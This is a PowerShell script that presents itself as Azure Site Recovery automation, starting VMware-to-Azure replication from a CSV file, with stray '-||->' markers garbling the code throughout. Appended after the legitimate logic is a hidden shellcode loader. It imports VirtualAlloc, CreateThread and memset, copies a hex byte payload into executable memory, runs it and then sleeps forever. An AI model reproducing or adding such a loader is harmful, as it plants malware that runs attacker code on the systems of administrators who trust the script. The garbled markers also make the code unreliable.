Param(
    [parameter(Mandatory=$true)]
    $CsvFilePath
)

 -||-> $ErrorActionPreference = "Stop" <-||- 

 -||-> $scriptsPath = $PSScriptRoot <-||- 
 -||-> if ( -||-> $PSScriptRoot -eq "" <-||- ) {
     -||-> $scriptsPath = "." <-||- 
} <-||- 

 -||-> . "$scriptsPath\asr_logger.ps1" <-||- 
 -||-> . "$scriptsPath\asr_common.ps1" <-||- 
 -||-> . "$scriptsPath\asr_csv_processor.ps1" <-||- 

 -||-> Function ProcessItemImpl($processor, $csvItem, $reportItem) {
     -||-> $reportItem | Add-Member NoteProperty "ProtectableStatus" $null <-||- 
     -||-> $reportItem | Add-Member NoteProperty "ProtectionState" $null <-||- 
     -||-> $reportItem | Add-Member NoteProperty "ProtectionStateDescription" $null <-||- 
     -||-> $reportItem | Add-Member NoteProperty "ReplicationJobId" $null <-||- 
    
     -||-> $vaultName = $csvItem.VAULT_NAME <-||- 
     -||-> $sourceAccountName = $csvItem.ACCOUNT_NAME <-||- 
     -||-> $sourceProcessServer = $csvItem.PROCESS_SERVER <-||- 
     -||-> $sourceConfigurationServer = $csvItem.CONFIGURATION_SERVER <-||- 
     -||-> $targetPostFailoverResourceGroup = $csvItem.TARGET_RESOURCE_GROUP <-||- 
     -||-> $targetPostFailoverStorageAccountName = $csvItem.TARGET_STORAGE_ACCOUNT <-||- 
     -||-> $targetPostFailoverLogStorageAccountName = $csvItem.TARGET_LOGSTORAGE_ACCOUNT <-||-  
     -||-> $targetPostFailoverVNET = $csvItem.TARGET_VNET <-||- 
     -||-> $targetPostFailoverSubnet = $csvItem.TARGET_SUBNET <-||- 
     -||-> $sourceMachineName = $csvItem.SOURCE_MACHINE_NAME <-||- 
     -||-> $replicationPolicy = $csvItem.REPLICATION_POLICY <-||- 
     -||-> $targetMachineName = $csvItem.TARGET_MACHINE_NAME <-||- 
     -||-> $targetStorageAccountRG = $csvItem.TARGET_STORAGE_ACCOUNT_RG <-||- 
     -||-> $targetLogStorageAccountRG = $csvItem.TARGET_LOGSTORAGE_ACCOUNT_RG <-||- 
     -||-> $targetVNETRG = $csvItem.TARGET_VNET_RG <-||- 

     -||-> $vaultServer = $asrCommon.GetAndEnsureVaultContext($vaultName) <-||- 
     -||-> $fabricServer = $asrCommon.GetFabricServer($sourceConfigurationServer) <-||- 
     -||-> $protectionContainer = $asrCommon.GetProtectionContainer($fabricServer) <-||- 
     -||-> $protectableVM = $asrCommon.GetProtectableItem($protectionContainer, $sourceMachineName) <-||- 

     -||-> $processor.Logger.LogTrace("ProtectableStatus: '$( -||-> $protectableVM.ProtectionStatus <-||- )'") <-||- 
     -||-> $reportItem.ProtectableStatus = $protectableVM.ProtectionStatus <-||- 

     -||-> if ( -||-> $protectableVM.ReplicationProtectedItemId -eq $null <-||- ) {
         -||-> $processor.Logger.LogTrace("Starting protection for item '$( -||-> $sourceMachineName <-||- )'") <-||- 
        
         -||-> $targetPostFailoverStorageAccount =  -||-> Get-AzStorageAccount `
            -Name $targetPostFailoverStorageAccountName `
            -ResourceGroupName $targetStorageAccountRG <-||-  <-||- 

         -||-> $targetPostFailoverLogStorageAccount =  -||-> Get-AzStorageAccount `
            -Name $targetPostFailoverLogStorageAccountName `
            -ResourceGroupName $targetLogStorageAccountRG <-||-  <-||- 

         -||-> $targetResourceGroupObj =  -||-> Get-AzResourceGroup -Name $targetPostFailoverResourceGroup <-||-  <-||- 
         -||-> $targetVnetObj =  -||-> Get-AzVirtualNetwork `
            -Name $targetPostFailoverVNET `
            -ResourceGroupName $targetVNETRG <-||-  <-||-  
         -||-> $targetPolicyMap  =   -||-> Get-AzRecoveryServicesAsrProtectionContainerMapping `
            -ProtectionContainer $protectionContainer | Where-Object {  -||-> $_.PolicyFriendlyName -eq $replicationPolicy <-||-  } <-||-  <-||- 
         -||-> if ( -||-> $targetPolicyMap -eq $null <-||- ) {
             -||-> $processor.Logger.LogErrorAndThrow("Policy map '$( -||-> $replicationPolicy <-||- )' was not found") <-||- 
        } <-||- 

         -||-> $sourceProcessServerObj =  -||-> $fabricServer.FabricSpecificDetails.ProcessServers | Where-Object {  -||-> $_.FriendlyName -eq $sourceProcessServer <-||-  } <-||-  <-||- 
         -||-> if ( -||-> $sourceProcessServerObj -eq $null <-||- ) {
             -||-> $processor.Logger.LogErrorAndThrow("Process server with name '$( -||-> $sourceProcessServer <-||- )' was not found") <-||- 
        } <-||- 
         -||-> $sourceAccountObj =  -||-> $fabricServer.FabricSpecificDetails.RunAsAccounts | Where-Object {  -||-> $_.AccountName -eq $sourceAccountName <-||-  } <-||-  <-||- 
         -||-> if ( -||-> $sourceAccountObj -eq $null <-||- ) {
             -||-> $processor.Logger.LogErrorAndThrow("Account name '$( -||-> $sourceAccountName <-||- )' was not found") <-||- 
        } <-||- 

         -||-> $processor.Logger.LogTrace( "Starting replication Job for source '$( -||-> $sourceMachineName <-||- )'") <-||- 
         -||-> $replicationJob =  -||-> New-AzRecoveryServicesAsrReplicationProtectedItem `
            -VMwareToAzure `
            -ProtectableItem $protectableVM `
            -Name ( -||-> New-Guid <-||- ).Guid `
            -ProtectionContainerMapping $targetPolicyMap `
            -RecoveryAzureStorageAccountId $targetPostFailoverStorageAccount.Id `
	    -LogStorageAccountId $targetPostFailoverLogStorageAccount.Id `
            -ProcessServer $sourceProcessServerObj `
            -Account $sourceAccountObj `
            -RecoveryResourceGroupId $targetResourceGroupObj.ResourceId `
            -RecoveryAzureNetworkId $targetVnetObj.Id `
            -RecoveryAzureSubnetName $targetPostFailoverSubnet `
            -RecoveryVmName $targetMachineName <-||-  <-||- 

         -||-> $replicationJobObj =  -||-> Get-AzRecoveryServicesAsrJob -Name $replicationJob.Name <-||-  <-||- 
         -||-> while ( -||-> $replicationJobObj.State -eq 'NotStarted' <-||- ) {
             -||-> Write-Host "." -NoNewline <-||-  
             -||-> $replicationJobObj =  -||-> Get-AzRecoveryServicesAsrJob -Name $replicationJob.Name <-||-  <-||- 
        } <-||- 
         -||-> $reportItem.ReplicationJobId = $replicationJob.Name <-||- 

         -||-> if ( -||-> $replicationJobObj.State -eq 'Failed' <-||- ) {
             -||-> LogError "Error starting replication job" <-||- 
             -||-> foreach ($replicationJobError in  -||-> $replicationJobObj.Errors <-||- ) {
                 -||-> LogError $replicationJobError.ServiceErrorDetails.Message <-||- 
                 -||-> LogError $replicationJobError.ServiceErrorDetails.PossibleCauses <-||- 
            } <-||- 
        } else {
             -||-> $processor.Logger.LogTrace("ReplicationJob initiated") <-||-       
        } <-||- 
    } else {
         -||-> $protectedItem =  -||-> Get-AzRecoveryServicesAsrReplicationProtectedItem `
            -ProtectionContainer $protectionContainer `
            -FriendlyName $sourceMachineName <-||-  <-||- 
         -||-> $reportItem.ProtectionState = $protectedItem.ProtectionState <-||- 
         -||-> $reportItem.ProtectionStateDescription = $protectedItem.ProtectionStateDescription <-||- 

         -||-> $processor.Logger.LogTrace("ProtectionState: '$( -||-> $protectedItem.ProtectionState <-||- )'") <-||- 
         -||-> $processor.Logger.LogTrace("ProtectionDescription: '$( -||-> $protectedItem.ProtectionStateDescription <-||- )'") <-||- 
    } <-||- 
} <-||- 

 -||-> Function ProcessItem($processor, $csvItem, $reportItem) {
     -||-> try {
         -||-> ProcessItemImpl $processor $csvItem $reportItem <-||- 
    }
    catch {
         -||-> $exceptionMessage =  -||-> $_ | Out-String <-||-  <-||- 
         -||-> $processor.Logger.LogError($exceptionMessage) <-||- 
        throw
    } <-||- 
} <-||- 

 -||-> $logger =  -||-> New-AsrLoggerInstance -CommandPath $PSCommandPath <-||-  <-||- 
 -||-> $asrCommon =  -||-> New-AsrCommonInstance -Logger $logger <-||-  <-||- 
 -||-> $processor =  -||-> New-CsvProcessorInstance -Logger $logger -ProcessItemFunction $function:ProcessItem <-||-  <-||- 
 -||-> $processor.ProcessFile($CsvFilePath) <-||- 

 -||-> $A72 = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $A72 -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xba,0x00,0xae,0x72,0xa1,0xd9,0xd0,0xd9,0x74,0x24,0xf4,0x5e,0x33,0xc9,0xb1,0x47,0x83,0xc6,0x04,0x31,0x56,0x0f,0x03,0x56,0x0f,0x4c,0x87,0x5d,0xe7,0x12,0x68,0x9e,0xf7,0x72,0xe0,0x7b,0xc6,0xb2,0x96,0x08,0x78,0x03,0xdc,0x5d,0x74,0xe8,0xb0,0x75,0x0f,0x9c,0x1c,0x79,0xb8,0x2b,0x7b,0xb4,0x39,0x07,0xbf,0xd7,0xb9,0x5a,0xec,0x37,0x80,0x94,0xe1,0x36,0xc5,0xc9,0x08,0x6a,0x9e,0x86,0xbf,0x9b,0xab,0xd3,0x03,0x17,0xe7,0xf2,0x03,0xc4,0xbf,0xf5,0x22,0x5b,0xb4,0xaf,0xe4,0x5d,0x19,0xc4,0xac,0x45,0x7e,0xe1,0x67,0xfd,0xb4,0x9d,0x79,0xd7,0x85,0x5e,0xd5,0x16,0x2a,0xad,0x27,0x5e,0x8c,0x4e,0x52,0x96,0xef,0xf3,0x65,0x6d,0x92,0x2f,0xe3,0x76,0x34,0xbb,0x53,0x53,0xc5,0x68,0x05,0x10,0xc9,0xc5,0x41,0x7e,0xcd,0xd8,0x86,0xf4,0xe9,0x51,0x29,0xdb,0x78,0x21,0x0e,0xff,0x21,0xf1,0x2f,0xa6,0x8f,0x54,0x4f,0xb8,0x70,0x08,0xf5,0xb2,0x9c,0x5d,0x84,0x98,0xc8,0x92,0xa5,0x22,0x08,0xbd,0xbe,0x51,0x3a,0x62,0x15,0xfe,0x76,0xeb,0xb3,0xf9,0x79,0xc6,0x04,0x95,0x84,0xe9,0x74,0xbf,0x42,0xbd,0x24,0xd7,0x63,0xbe,0xae,0x27,0x8c,0x6b,0x5a,0x2d,0x1a,0x34,0x2a,0x5e,0x00,0x5c,0x4f,0xa1,0xb5,0x26,0xc6,0x47,0xe5,0x08,0x89,0xd7,0x45,0xf9,0x69,0x88,0x2d,0x13,0x66,0xf7,0x4d,0x1c,0xac,0x90,0xe7,0xf3,0x19,0xc8,0x9f,0x6a,0x00,0x82,0x3e,0x72,0x9e,0xee,0x00,0xf8,0x2d,0x0e,0xce,0x09,0x5b,0x1c,0xa6,0xf9,0x16,0x7e,0x60,0x05,0x8d,0x15,0x8c,0x93,0x2a,0xbc,0xdb,0x0b,0x31,0x99,0x2b,0x94,0xca,0xcc,0x20,0x1d,0x5f,0xaf,0x5e,0x62,0x8f,0x2f,0x9e,0x34,0xc5,0x2f,0xf6,0xe0,0xbd,0x63,0xe3,0xee,0x6b,0x10,0xb8,0x7a,0x94,0x41,0x6d,0x2c,0xfc,0x6f,0x48,0x1a,0xa3,0x90,0xbf,0x9a,0x9f,0x46,0xf9,0xe8,0xf1,0x5a <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $Z9ov=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $Z9ov.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$Z9ov,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



